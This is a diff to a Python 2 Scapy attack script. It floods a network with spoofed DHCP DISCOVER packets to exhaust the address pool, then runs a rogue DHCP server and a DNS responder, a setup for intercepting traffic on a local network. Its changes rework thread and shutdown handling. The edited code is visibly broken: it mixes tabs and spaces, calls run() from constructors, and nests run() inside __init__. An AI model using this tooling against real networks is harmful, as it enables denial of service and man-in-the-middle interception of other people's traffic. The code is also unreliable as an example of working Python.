@@ -35,7 +35,7 @@ def checkArgs():
 	start_ip = args.start
 	end_ip = args.end
 	netmask = args.netmask
-	
+
 	if args.starve != None:
 		starve = args.starve
 
@@ -46,16 +46,6 @@ def checkArgs():
 	if atol(start_ip) > atol(end_ip):
 		print "err: start ip is larger than end ip"
 		sys.exit(2)
-
-def sig_handler(signal, frame):
-	print "Ending program"
-	
-	i = 0
-	for t in threadPool:
-		t.kill = True
-		print "Waiting for Thread %d to die" %i
-		i += 1
-	os.exit(0)
 
 class dhcp_starve(threading.Thread):
 	def __init__(self):
@@ -70,8 +60,8 @@ class dhcp_starve(threading.Thread):
 		dhcp_discover /= IP(src="0.0.0.0",dst="255.255.255.255")
 		dhcp_discover /= UDP(sport=68, dport=67)
 		dhcp_discover /= BOOTP(chaddr=RandString(12,'0123456789abcdef'))
-		dhcp_discover /= DHCP(options=[("message-type","discover"),"end"]) 
-		
+		dhcp_discover /= DHCP(options=[("message-type","discover"),"end"])
+
 		while not self.kill:
 			sendp(dhcp_discover, iface=interface)
 
@@ -98,8 +88,9 @@ class dhcp_server(threading.Thread):
 		self.default_ttl=mac2str('40')
 		self.T1=0
 		self.T2=0
-
 		self.broadcast = ltoa(atol(self.myIP) | (0xffffffff & ~atol(self.netmask)))
+                self.daemon = True
+                self.run()
 
 	def parser_args(self,**kargs):
 		"""Sets keyword arguments into attributes"""
@@ -114,7 +105,7 @@ class dhcp_server(threading.Thread):
 
 	def poolfree(self, mac):
 		"""
-		Retrieves an IP from pool of IP, 
+		Retrieves an IP from pool of IP,
 		if no IP is available, return 0.0.0.0
 		"""
 		if mac in self.macip_dict.keys():
@@ -128,16 +119,14 @@ class dhcp_server(threading.Thread):
 
 	def run(self):
 		"""Main thread function"""
-
-		while not self.kill:
-			print "running DHCP server on", self.myMAC, ":", self.myIP
-			print "sniffing..."
-			sniff(filter=self.filter, prn=self.detect_parserDhcp, store=0, iface=self.iface)
+                print "running DHCP server on", self.myMAC, ":", self.myIP
+                print "sniffing..."
+                sniff(filter=self.filter, prn=self.detect_parserDhcp, store=0, iface=self.iface)
 
 	def detect_parserDhcp(self, pkt):
 		"""
 		receives pkt and checks if it is a DHCP packet.
-		
+
 		Message Types:
 		1->Discover
 		2->OFFER
@@ -172,7 +161,7 @@ class dhcp_server(threading.Thread):
 			]
 
 			Mtype = pkt[DHCP].options[0][1]
-			print "DHCP option", Mtype 
+			print "DHCP option", Mtype
 			if Mtype == 1 or Mtype == 3:
 				dhcpsip = pkt[IP].src
 				dhcpsmac = pkt[Ether].src
@@ -190,7 +179,7 @@ class dhcp_server(threading.Thread):
 						  BootpHeader/
 						  DHCP(options=[("message-type","nak"),("server_id",self.myIP),"end"]))
 					sendp(nak ,verbose=0, iface=self.iface)
-				
+
 				else:
 					if Mtype == 1:
 						# Respond to DISCOVER Packets
@@ -275,14 +264,16 @@ class dhcp_server(threading.Thread):
 class DNS_server(threading.Thread):
 	def __init__(self, **kwargs):
 		threading.Thread.__init__(self)
-		
+
 		self.myIP = get_if_addr(interface)
 		self.filter = "udp port 53 and ip dst " + self.myIP
 		self.kill = False
 		self.parse_args(**kwargs)
-		def run(self):
-			while not self.kill:
-				sniff(filter=self.filter, prn=detect_dns, iface=interface)
+                self.daemon = True
+                self.run()
+
+                def run(self):
+                        sniff(filter=self.filter, prn=detect_dns, iface=interface, store=0)
 
 		def parser_args(self,**kwargs):
 			"""Sets keyword arguments into attributes"""
@@ -323,33 +314,38 @@ class DNS_server(threading.Thread):
 
 if __name__ == "__main__":
 	checkArgs()
-	signal.signal(signal.SIGINT, sig_handler)
 
 	kargs = {
 		"iface": interface,
-		"netmask": netmask, 
+		"netmask": netmask,
 		"start_sip": start_ip,
 		"start_eip": end_ip,
 	}
-    
+
 	dns_kargs = {
 		"domain": domain,
 	}
-    
-	if starve:
-		print "Starting DHCP starvation"
-		t=dhcp_starve()
-		t.start()
-		time.sleep(10)
-		t.kill = True
-		print "Stopping DHCP starvation"
-	
-	
-	t = dhcp_server(**kargs)
-	t.start()
-	threadPool.append(t)
 
-	if dns:
-		t = DNS_server(**dns_kargs)
-		t.start()
-		threadPool.append(t)
+        try:
+            if starve:
+                    print "Starting DHCP starvation"
+                    t=dhcp_starve()
+                    t.start()
+                    time.sleep(10)
+                    t.kill = True
+                    print "Stopping DHCP starvation"
+
+
+            t = dhcp_server(**kargs)
+            t.start()
+            threadPool.append(t)
+
+            if dns:
+                    t = DNS_server(**dns_kargs)
+                    t.start()
+                    threadPool.append(t)
+        except KeyboardInterrupt:
+            for t in threadPool:
+                t.join()
+
+            sys.exit(0)
